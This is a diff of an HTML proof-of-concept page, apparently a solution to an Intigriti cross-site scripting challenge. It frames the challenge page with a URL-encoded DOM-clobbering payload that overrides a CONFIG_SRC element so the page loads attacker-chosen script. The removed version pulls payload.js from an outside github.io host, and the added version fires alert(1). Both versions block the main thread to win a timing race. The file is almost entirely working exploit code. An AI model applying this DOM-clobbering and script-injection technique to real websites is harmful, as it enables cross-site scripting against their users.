@@ -1,23 +1,19 @@
 <html>
 <body>
-<iframe id="content" style="width: 50%; height: 50%;"></iframe>
+<iframe id="content"></iframe>
 
 <script>
-function load_iframe() {
-    document.getElementById('content').src = '';
-    console.log('Loading iframe...');
-
-    const payload = '%3Cform%20name%3DCONFIG_SRC%20data-url%3Dhttps%3A%2F%2Fchallenge-0525.intigriti.io%255C%2540pedrojuniorrd.github.io%2Fpayload.js%3E%3C%2Fform%3E';
-    document.getElementById('content').src = 'https://challenge-0525.intigriti.io/index.html?name=' + payload;
+function loadIframe() {
+    const payload = encodeURIComponent('<span id="CONFIG_SRC" data-url="/message?name=alert(1)"></span>');
+    const url = `https://challenge-0525.intigriti.io/index.html?name=${payload}`;
+    document.getElementById('content').src = url;
 }
 
-console.log('Loading iframe...');
-load_iframe();
+loadIframe();
 
-console.log('Locking up main thread');
-const busyUntil = performance.now() + 4500;
-while (performance.now() < busyUntil) {}
-console.log('Releasing Lock');
+// Block main thread to ensure DOM Clobbering happens before addDynamicScript
+const start = Date.now();
+while (Date.now() - start < 5000) {}
 </script>
 </body>
 </html>
